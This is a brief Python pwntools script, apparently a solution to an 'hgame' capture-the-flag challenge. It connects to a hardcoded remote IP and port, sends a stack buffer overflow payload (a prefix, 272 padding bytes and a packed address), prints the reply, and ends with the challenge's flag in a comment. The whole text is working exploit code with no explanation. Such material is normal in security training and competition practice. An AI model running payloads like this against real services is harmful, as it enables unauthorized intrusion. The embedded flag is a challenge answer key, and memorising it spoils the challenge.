from pwn import *


p = remote('111.230.149.72', 10002)
payload = "1220" + "A"*272 + p32(0x4c4)
p.sendline(payload)
data = p.recvall()
print data

#hgame{S0unds_L1ke_U_KN0wn_h0w_st4ck_works}
